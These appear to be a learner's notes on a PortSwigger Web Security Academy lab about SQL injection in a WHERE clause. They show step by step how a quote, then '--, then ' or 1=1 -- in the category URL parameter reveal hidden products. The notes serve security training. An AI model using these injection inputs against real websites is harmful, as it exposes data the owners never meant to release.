https://www.youtube.com/watch?v=wX6tszfgYp4


# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data                                  video: https://www.youtube.com/watch?v=X1X1UdaC_90

notes:
SQLi Product category filter (https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) 


Query structure : SELECT * FROM products WHERE category = 'Gifts' AND released = 1

end goal: display all products regardless of category both released and unreleased.
application by default do show unreleased product to user but sqli does it.

Analysis:

https://0a6c008403c5a91d8394f18000c4007b.web-security-academy.net/filter?category=Corporate+gifts for the url 
the query is  
SELECT * FROM products WHERE category = 'Corporate+gifts' AND released = 1

when we put ( ' ) to test the sqli   
https://0a6c008403c5a91d8394f18000c4007b.web-security-academy.net/filter?category='
for the url 
the query is  
SELECT * FROM products WHERE category = ''' AND released = 1

and it shows internal server error 


SELECT * FROM products WHERE category = ' '-- ' AND released = 1
then use  '-- , now it shows empty means the query executed hence sqli present


SELECT * FROM products WHERE category = ' '  or 1=1 -- ' AND released = 1
then use **'  or 1=1 --**  now it shows all product  means the query executed hence sqli exploited.